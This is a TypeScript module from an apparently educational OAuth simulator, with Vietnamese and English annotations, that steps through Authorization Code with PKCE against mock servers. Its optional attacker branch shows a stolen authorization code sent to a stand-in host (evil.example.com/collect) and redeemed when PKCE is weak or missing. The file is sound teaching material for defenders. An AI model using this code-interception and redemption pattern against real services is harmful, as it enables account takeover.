import { challengeFrom, createVerifier, type PkceMethod } from '../crypto/pkce';
import { randomToken } from '../util/base64url';
import { tr } from '../i18n';
import type { Clock } from '../core/Clock';
import type { MockAuthServer } from '../server/MockAuthServer';
import type { ResourceApi } from '../server/ResourceApi';
import type { Packet } from '../core/types';
import { httpText, type FlowResult } from './kit';

export interface FlowOptions {
  pkceMethod: PkceMethod;
  /** Simulate an attacker who observes the front channel and races the client. */
  interceptCode: boolean;
  scope: string;
  requiredScope: string;
  username: string;
  /** Thử thách đổi được cái này để thấy vì sao phải khớp tuyệt đối. */
  redirectUri?: string;
}

const CLIENT_ID = 'spa-dashboard';
const DEFAULT_REDIRECT = 'https://spa.example.com/callback';

/**
 * Authorization Code + PKCE, run as a sequence of observable hops.
 *
 * Nothing here fakes an outcome: every accept or reject comes back from the
 * server objects, which run real SHA-256 and real RSA. Flip pkceMethod to
 * 'plain' or 'none' and the attacker genuinely wins, because the code_verifier
 * is genuinely recoverable from the front channel in those modes.
 */
export async function runAuthCodePkce(
  clock: Clock,
  authServer: MockAuthServer,
  api: ResourceApi,
  opts: FlowOptions,
): Promise<FlowResult> {
  const redirectUri = opts.redirectUri ?? DEFAULT_REDIRECT;
  const packets: Packet[] = [];
  let seq = 0;
  const push = (p: Omit<Packet, 'id' | 'seq' | 'atSec'>): Packet => {
    const packet: Packet = { ...p, id: `p${seq}`, seq, atSec: clock.nowSec() };
    seq += 1;
    packets.push(packet);
    return packet;
  };

  // --- Client prepares PKCE. The verifier never leaves this machine.
  const verifier = createVerifier();
  const challenge = await challengeFrom(verifier, opts.pkceMethod);
  const state = randomToken(12);

  push({
    from: 'browser',
    to: 'client',
    label: tr('User bấm "Đăng nhập"', 'User clicks "Log in"'),
    tone: 'normal',
    http: { kind: 'request', method: 'GET', url: 'https://spa.example.com/', headers: {} },
    note: tr(
      'Chưa có gì bí mật. Ngay sau đây client sẽ tự sinh một chuỗi bí mật dùng một lần và giữ riêng cho mình.',
      'Nothing secret yet. Right after this, the client will generate a one-time secret string and keep it to itself.',
    ),
  });

  push({
    from: 'client',
    to: 'browser',
    label: '302 -> /authorize',
    tone: 'normal',
    http: {
      kind: 'response',
      status: 302,
      statusText: 'Found',
      headers: {
        Location:
          `https://id.example.com/authorize?response_type=code&client_id=${CLIENT_ID}` +
          `&redirect_uri=${encodeURIComponent(redirectUri)}&scope=${encodeURIComponent(opts.scope)}` +
          `&state=${state}` +
          (challenge ? `&code_challenge=${challenge}&code_challenge_method=${opts.pkceMethod}` : ''),
      },
    },
    note:
      opts.pkceMethod === 'S256'
        ? tr(
            `Client đã sinh code_verifier "${verifier.slice(0, 12)}..." nhưng chỉ gửi bản băm SHA-256 của nó. Bản băm là công khai, chuỗi gốc thì không.`,
            `The client generated code_verifier "${verifier.slice(0, 12)}..." but only sends its SHA-256 hash. The hash is public; the original string is not.`,
          )
        : opts.pkceMethod === 'plain'
          ? tr(
              'code_challenge_method=plain nghĩa là challenge chính là verifier - nó đang nằm nguyên văn trong URL này. Xem kẻ tấn công làm gì với nó.',
              'code_challenge_method=plain means the challenge IS the verifier — it is sitting in plain text right in this URL. Watch what the attacker does with it.',
            )
          : tr(
              'Không có tham số PKCE nào. Authorization code sẽ thành bearer thuần: ai giữ người đó tiêu được.',
              'No PKCE parameters at all. The authorization code becomes a plain bearer credential: whoever holds it can redeem it.',
            ),
    tokens: challenge ? [{ label: 'code_challenge', value: challenge }] : [],
  });

  // --- Front channel. Redirects are visible: browser history, Referer headers,
  //     server logs, a malicious app registered on the same custom scheme.
  const authorizeUrl =
    `https://id.example.com/authorize?response_type=code&client_id=${CLIENT_ID}` +
    `&redirect_uri=${encodeURIComponent(redirectUri)}&state=${state}` +
    (challenge ? `&code_challenge=${challenge}&code_challenge_method=${opts.pkceMethod}` : '');

  push({
    from: 'browser',
    to: 'authserver',
    label: 'GET /authorize',
    tone: 'normal',
    http: { kind: 'request', method: 'GET', url: authorizeUrl, headers: { Host: 'id.example.com' } },
    note: tr('Front channel đi qua trình duyệt, nên coi mọi thứ trong đó là công khai.', 'The front channel goes through the browser, so treat everything in it as public.'),
  });

  const authResult = authServer.authorize({
    clientId: CLIENT_ID,
    redirectUri: redirectUri,
    scope: opts.scope,
    state,
    codeChallenge: challenge,
    codeChallengeMethod: opts.pkceMethod,
    username: opts.username,
  });

  push({
    from: 'authserver',
    to: 'browser',
    label: `${authResult.status} -> callback?code=...`,
    tone: authResult.status === 302 ? 'normal' : 'blocked',
    http: {
      kind: 'response',
      status: authResult.status,
      statusText: authResult.statusText,
      headers: authResult.headers,
      body: httpText(authResult.body),
    },
    note: authResult.reason,
  });

  if (authResult.status !== 302) {
    return { packets, outcome: 'failed', summary: authResult.reason };
  }

  const code = new URL(authResult.headers['Location']!).searchParams.get('code')!;

  push({
    from: 'browser',
    to: 'client',
    label: 'GET /callback?code=...',
    tone: 'normal',
    http: {
      kind: 'request',
      method: 'GET',
      url: `${redirectUri}?code=${code}&state=${state}`,
      headers: { Referer: 'https://id.example.com/' },
    },
    note: tr('Client phải so giá trị state này với cái nó đã lưu. Bỏ bước đó là có lỗ CSRF.', 'The client must compare this state value against the one it stored. Skip that step and there is a CSRF hole.'),
    tokens: [{ label: 'authorization code', value: code }],
  });

  // --- The attack. The attacker has the code (it was in a redirect) and, in
  //     plain/none mode, everything else needed to spend it.
  if (opts.interceptCode) {
    const stolenVerifier = opts.pkceMethod === 'plain' ? challenge! : opts.pkceMethod === 'none' ? undefined : 'guess-' + randomToken(8);

    push({
      from: 'browser',
      to: 'attacker',
      label: tr('Code lọt sang kẻ tấn công', 'Code leaks to the attacker'),
      tone: 'danger',
      http: {
        kind: 'request',
        method: 'GET',
        url: `https://evil.example.com/collect?code=${code}&seen_challenge=${challenge ?? '(none)'}`,
        headers: {},
      },
      note: tr(
        'Ngoài thực tế chuyện này xảy ra qua: app độc hại đăng ký cùng một custom scheme, Referer leak, history dùng chung, hoặc log proxy. Cứ coi như code là công khai ngay khi nó bước vào front channel.',
        'In real life this happens via: a malicious app registered on the same custom scheme, a Referer leak, shared browser history, or a proxy log. Treat the code as public the moment it enters the front channel.',
      ),
      tokens: [{ label: 'stolen code', value: code }],
    });

    const attackerResult = await authServer.token({
      grantType: 'authorization_code',
      code,
      clientId: CLIENT_ID,
      redirectUri: redirectUri,
      ...(stolenVerifier ? { codeVerifier: stolenVerifier } : {}),
    });

    push({
      from: 'attacker',
      to: 'authserver',
      label: tr('POST /token (code bị trộm)', 'POST /token (stolen code)'),
      tone: 'danger',
      http: {
        kind: 'request',
        method: 'POST',
        url: 'https://id.example.com/token',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body:
          `grant_type=authorization_code&code=${code}&client_id=${CLIENT_ID}` +
          `&redirect_uri=${encodeURIComponent(redirectUri)}` +
          (stolenVerifier ? `&code_verifier=${stolenVerifier}` : ''),
      },
      note:
        opts.pkceMethod === 'S256'
          ? tr(
              'Kẻ tấn công phải tìm ra một code_verifier mà SHA-256 của nó bằng đúng challenge. Đó là bài toán đảo ngược SHA-256, nên nó chỉ còn cách đoán.',
              'The attacker would need to find a code_verifier whose SHA-256 equals the challenge. That is reversing SHA-256, so all it can do is guess.',
            )
          : opts.pkceMethod === 'plain'
            ? tr(
                'Với method=plain, kẻ tấn công chỉ cần phát lại đúng cái challenge nó đọc từ URL - vì đó chính là verifier.',
                'With method=plain, the attacker just replays the exact challenge it read from the URL — because that IS the verifier.',
              )
            : tr('Không cần verifier nên nó không gửi gì cả.', 'No verifier is needed, so it sends nothing.'),
    });

    const attackerWon = attackerResult.status === 200;
    push({
      from: 'authserver',
      to: 'attacker',
      label: `${attackerResult.status} ${attackerResult.statusText}`,
      tone: attackerWon ? 'danger' : 'blocked',
      http: {
        kind: 'response',
        status: attackerResult.status,
        statusText: attackerResult.statusText,
        headers: attackerResult.headers,
        body: httpText(attackerResult.body),
      },
      note: attackerResult.reason,
      tokens: attackerWon
        ? [{ label: 'access_token (stolen)', value: (attackerResult.body as Record<string, string>)['access_token']! }]
        : [],
    });

    if (attackerWon) {
      return {
        packets,
        outcome: 'attacker-won',
        summary: tr(
          `Kẻ tấn công đang giữ access token hợp lệ của ${opts.username}. Đổi code_challenge_method sang S256 rồi chạy lại: vẫn đúng cái code bị trộm đó, nhưng lần này đổi không được.`,
          `The attacker is holding a valid access token for ${opts.username}. Switch code_challenge_method to S256 and run it again: the exact same stolen code, but this time it cannot be redeemed.`,
        ),
      };
    }
  }

  // --- Back channel. Only now does the verifier leave the client, over a
  //     direct connection that the user agent never sees.
  push({
    from: 'client',
    to: 'authserver',
    label: tr('POST /token (kèm code_verifier)', 'POST /token (with code_verifier)'),
    tone: 'normal',
    http: {
      kind: 'request',
      method: 'POST',
      url: 'https://id.example.com/token',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body:
        `grant_type=authorization_code&code=${code}&client_id=${CLIENT_ID}` +
        `&redirect_uri=${encodeURIComponent(redirectUri)}&code_verifier=${verifier}`,
    },
    note: tr('Back channel: client gọi thẳng server. Đây là lần đầu tiên và duy nhất code_verifier được truyền đi.', 'Back channel: the client calls the server directly. This is the first and only time code_verifier is transmitted.'),
    tokens: [{ label: 'code_verifier', value: verifier }],
  });

  const tokenResult = await authServer.token({
    grantType: 'authorization_code',
    code,
    clientId: CLIENT_ID,
    redirectUri: redirectUri,
    codeVerifier: verifier,
  });

  const tokenBody = tokenResult.body as Record<string, string> | undefined;
  push({
    from: 'authserver',
    to: 'client',
    label: `${tokenResult.status} ${tokenResult.statusText}`,
    tone: tokenResult.status === 200 ? 'success' : 'blocked',
    http: {
      kind: 'response',
      status: tokenResult.status,
      statusText: tokenResult.statusText,
      headers: tokenResult.headers,
      body: httpText(tokenResult.body),
    },
    note: tokenResult.reason,
    tokens:
      tokenResult.status === 200 && tokenBody
        ? [
            { label: 'access_token', value: tokenBody['access_token']! },
            { label: 'id_token', value: tokenBody['id_token']! },
          ]
        : [],
  });

  if (tokenResult.status !== 200 || !tokenBody) {
    return {
      packets,
      outcome: 'failed',
      summary:
        opts.interceptCode && tokenResult.status === 400
          ? tr(
              'Client thật bị chặn vì kẻ tấn công đã tiêu mất cái code dùng-một-lần trước đó. Phát hiện code bị dùng lại chính là lý do server thật thu hồi toàn bộ phiên.',
              'The real client got blocked because the attacker already spent the single-use code first. Detecting a reused code is exactly why a real server revokes the whole grant.',
            )
          : tokenResult.reason,
    };
  }

  const accessToken = tokenBody['access_token']!;

  // --- The API validates on its own, using only public keys.
  const jwks = api.loadJwks();
  push({
    from: 'api',
    to: 'authserver',
    label: jwks.cached ? tr('JWKS (đã cache)', 'JWKS (cached)') : 'GET /.well-known/jwks.json',
    tone: 'normal',
    http: {
      kind: 'request',
      method: 'GET',
      url: 'https://id.example.com/.well-known/jwks.json',
      headers: {},
    },
    note: tr(
      `API không giữ secret dùng chung nào, chỉ có public key (kid "${authServer.signingKid}"). Nó verify được nhưng không phát token được.`,
      `The API holds no shared secret at all, only the public key (kid "${authServer.signingKid}"). It can verify but never mint tokens.`,
    ),
  });

  const apiReq = push({
    from: 'client',
    to: 'api',
    label: 'GET /me (Bearer)',
    tone: 'normal',
    http: {
      kind: 'request',
      method: 'GET',
      url: 'https://api.example.com/me',
      headers: { Authorization: `Bearer ${accessToken.slice(0, 24)}...` },
    },
    note: tr('Click vào chặng này rồi mở tab Token để mổ access token ra từng claim.', 'Click this hop, then open the Token tab, to take the access token apart claim by claim.'),
    tokens: [{ label: 'access_token', value: accessToken }],
  });

  const apiResult = await api.request('/me', accessToken, opts.requiredScope);
  // Attach the verdict to the hop that carried the token, so the Token tab can
  // show every check the API actually ran.
  apiReq.verification = apiResult.verification;

  push({
    from: 'api',
    to: 'client',
    label: `${apiResult.status} ${apiResult.statusText}`,
    tone: apiResult.status === 200 ? 'success' : 'blocked',
    http: {
      kind: 'response',
      status: apiResult.status,
      statusText: apiResult.statusText,
      headers: apiResult.headers,
      body: httpText(apiResult.body),
    },
    note: apiResult.reason,
  });

  return {
    packets,
    outcome: apiResult.status === 200 ? 'success' : 'failed',
    summary:
      apiResult.status === 200
        ? tr(`Luồng hoàn tất. ${apiResult.reason}`, `Flow complete. ${apiResult.reason}`)
        : apiResult.reason,
  };
}
